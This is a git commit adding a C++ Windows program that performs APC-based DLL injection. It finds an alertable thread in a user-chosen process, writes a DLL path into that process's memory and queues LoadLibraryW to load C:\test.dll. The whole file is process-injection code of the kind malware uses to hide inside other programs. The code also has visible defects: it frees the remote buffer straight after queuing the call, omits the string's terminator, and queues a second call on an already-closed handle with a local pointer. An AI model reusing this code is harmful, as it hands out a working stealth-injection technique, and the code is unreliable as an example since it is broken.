1aee9245f0c2854a60208b68ac0aacf95a61ef6d
Gal Yaniv <gal@byon-it.com>
2021-01-03 18:48:45 +0200

    APC Dll Injection

---
+++ APC/APC Dll Injection/mainAPC.cpp
@@ -0,0 +1,96 @@
+#include <Windows.h>
+#include <iostream>
+#include <tlhelp32.h>
+
+#define DLL_PATH L"C:\\test.dll"
+
+using namespace std;
+
+HANDLE findAlertableThread(DWORD pId) {
+	THREADENTRY32 thread32 = { sizeof(THREADENTRY32) };
+	HANDLE targetProcessThreadArray[MAXIMUM_WAIT_OBJECTS], threadHandle;
+	HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pId);
+	DWORD threadCount = 0;
+	if (!Thread32First(threadSnapshot, &thread32)) {
+		cout << "Error: coudn't get first thread from process snapshot (" << GetLastError() << ")" << endl;
+		return 0;
+	}
+	do
+	{
+		if (thread32.th32OwnerProcessID != pId) continue;
+		threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread32.th32ThreadID);
+		if (threadHandle != INVALID_HANDLE_VALUE && threadHandle != NULL) {
+			targetProcessThreadArray[threadCount] = threadHandle;
+		}
+		threadCount++;
+		if (threadCount == MAXIMUM_WAIT_OBJECTS) {
+			break;
+		}
+	} while (Thread32Next(threadSnapshot, &thread32));
+
+	// Creating Events
+	HANDLE hEvents[MAXIMUM_WAIT_OBJECTS];
+	for (DWORD i = 0; i < threadCount; i++) {
+		hEvents[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
+	}
+
+	// Duplicating Handles to Events Objects (to remote thread)
+	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
+	HANDLE hTargetEvents[MAXIMUM_WAIT_OBJECTS];
+	for (DWORD i = 0; i < threadCount; i++) {
+		DuplicateHandle(GetCurrentProcess(), hEvents[i], hTargetProcess, &hTargetEvents[i], 0, FALSE, DUPLICATE_SAME_ACCESS);
+	}
+
+	for (DWORD i = 0; i < threadCount; i++) {
+		QueueUserAPC((PAPCFUNC)&SetEvent, targetProcessThreadArray[i], (ULONG_PTR)hTargetEvents[i]);
+	}
+
+	DWORD tEvent = WaitForMultipleObjects(threadCount, hEvents, FALSE, 10000);
+
+	// Get Alertable Thread by event that was signaled
+	HANDLE hAlertableThread = NULL;
+	if (tEvent != WAIT_TIMEOUT) {
+		hAlertableThread = targetProcessThreadArray[tEvent];
+	}
+	for (DWORD i = 0; i < threadCount; i++) {
+		DuplicateHandle(hTargetProcess, hTargetEvents[i], GetCurrentProcess(), &hEvents[i], 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		CloseHandle(hEvents[i]);
+		if (targetProcessThreadArray[i] != hAlertableThread) {
+			CloseHandle(targetProcessThreadArray[i]);
+		}
+	}
+	CloseHandle(threadSnapshot);
+	return hAlertableThread;
+
+
+}
+
+void InjectDll(HANDLE hThread, DWORD processId, LPCWSTR dllName) {
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+	LPVOID address = NULL;
+	address = VirtualAllocEx(hProcess, NULL, lstrlenW(dllName)*sizeof(TCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	SIZE_T bytesWriten;
+	WriteProcessMemory(hProcess, address, dllName, lstrlenW(dllName) * sizeof(TCHAR), &bytesWriten);
+	QueueUserAPC((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)address);
+	VirtualFreeEx(hProcess, address, bytesWriten, MEM_DECOMMIT | MEM_RELEASE);
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+	QueueUserAPC((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)dllName);
+}
+
+
+int main() {
+	DWORD processId = 0;
+	cout << "Enter process Id: ";
+	cin >> processId;
+	if (!processId) {
+		cout << "Error: you need to enter an integer between 1 - 65536" << endl;
+		return 0;
+	}
+	HANDLE hAlertableThread = findAlertableThread(processId);
+	DWORD threadId = GetThreadId(hAlertableThread);
+	cout << "Aletable Thread Handle: " << hAlertableThread << " and Thread Id: " << threadId << endl;
+
+	InjectDll(hAlertableThread, processId, DLL_PATH);
+	return 1;
+}
